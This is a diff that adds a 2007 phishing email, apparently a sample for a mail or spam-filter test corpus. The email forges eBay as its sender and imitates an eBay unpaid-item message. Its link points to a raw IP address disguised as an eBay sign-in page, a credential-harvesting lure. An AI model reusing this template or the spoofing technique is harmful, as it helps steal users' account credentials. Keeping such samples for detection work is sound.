@@ -1,0 +1,86 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <beth@example.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 4E791468D8
+ for <user@login.example.com>; Thu, 12 Apr 2007 23:12:14 -0400 (EDT)
+Received: from example.com (example.com [152.160.49.201])
+ by mail.example.org (Postfix) with ESMTP id 4AE82131FB40
+ for <user@example.com>; Thu, 12 Apr 2007 23:12:14 -0400 (EDT)
+Received: by example.com (Postfix, from userid 1026)
+ id 44EB4468DB; Thu, 12 Apr 2007 23:12:14 -0400 (EDT)
+Received: from localhost (localhost [127.0.0.1])
+ by example.com (Postfix) with ESMTP id 41BB4468D8
+ for <user@example.com>; Thu, 12 Apr 2007 23:12:14 -0400 (EDT)
+X-Return-Path: <aw-confirm@ebay.com>
+X-Original-To: beth@login.example.com
+X-Delivered-To: beth@login.example.com
+X-Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 31873468D6
+ for <beth@login.example.com>; Wed, 11 Apr 2007 15:18:34 -0400 (EDT)
+X-Received: from mail.itbs.com.tw (unknown [203.70.207.59])
+ by mail.example.org (Postfix) with ESMTP id E2C8F131FC28
+ for <beth@example.com>; Wed, 11 Apr 2007 15:18:33 -0400 (EDT)
+X-Received: by mail.itbs.com.tw (Postfix, from userid 511)
+ id B87BCF3A4; Thu, 12 Apr 2007 00:20:36 +0800 (CST)
+X-Received: from User (unknown [12.38.252.212])
+ by mail.itbs.com.tw (Postfix) with ESMTP
+ id 55111F3A0; Thu, 12 Apr 2007 00:19:50 +0800 (CST)
+From: "aw-confirm@ebay.com" <aw-confirm@ebay.com>
+Subject: eBay New Unpaid Item Message from selectiveseating:
+Date: Wed, 11 Apr 2007 13:21:36 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20070411161950.55111F3A0@mail.itbs.com.tw>
+To: undisclosed-recipients: ;
+ReSent-Date: Thu, 12 Apr 2007 23:12:10 -0400 (EDT)
+ReSent-From: Beth Nazario <beth@example.com>
+ReSent-To: user <user@example.com>
+ReSent-Subject: eBay New Unpaid Item Message from selectiveseating:
+ReSent-Message-ID: <Pine.BSO.4.64.0704122312100.1205@example.com>
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 1116
+
+<P>
+<TABLE cellSpacing=0 cellPadding=0 width=600>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" width=600>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0 xmlns:x="urn:schemas-microsoft-com:xslt">
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" width=600>
+<TABLE cellSpacing=0 cellPadding=2 width="100%" bgColor=#eeeef8 border=0>
+<TBODY>
+<TR>
+<TD width=2><IMG src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width=2></TD>
+<TD><FONT face=Arial size=4>eBay New Unpaid Item Message from selectiveseating:
+ #320069534675
+
+ -- response required</FONT> </TD>
+<TD vAlign=center><A href="http://www.ebay.com/" target=_blank><IMG src="http://pics.ebaystatic.com/aw/pics/email/eBayLogo.gif" align=right border=0></A></TD></TR>
+<TR bgColor=#9999cc height=2>
+<TD colSpan=3></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD>
+<TABLE style="FONT-SIZE: x-small; FONT-FAMILY: arial, sans-serif" cellSpacing=0 cellPadding=0 width="94%" align=center border=0>
+<TBODY>
+<TR>
+<TD><BR><BR>
+Dear member, <BR>
+<BR></TD></TR>
+<TR>
+<TD>eBay member selectiveseating has left you a message regarding item #320069534675<BR>
+  <BR><A href="http://203.88.138.116/database/themes/darkblue_orange/css/theme_right.css.php1/signin.ebay.com/ws/ebayISPP.dll/SignIn/index.html?SignIn&co_partnerId=2&pUserId=&siteid=0&pageType=&pa1=&i1=&bshowgif=&UsingSSL=&ru=http%3A%2F%2Fwww.ebay.com&pp=&pa2=&errmsg=&runame=&ruparams=&ruproduct=&sid=&favoritenav=&confirm=&ebxPageType=&existingEmail=&isCheckout=&migrateVisitor=" target=_blank><FONT color=#003399>View the dispute thread to respond</FONT></A>. <BR>
+  <BR></TD></TR>
+<TR>
+<TD>Regards, <BR><BR>eBay </TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></P>
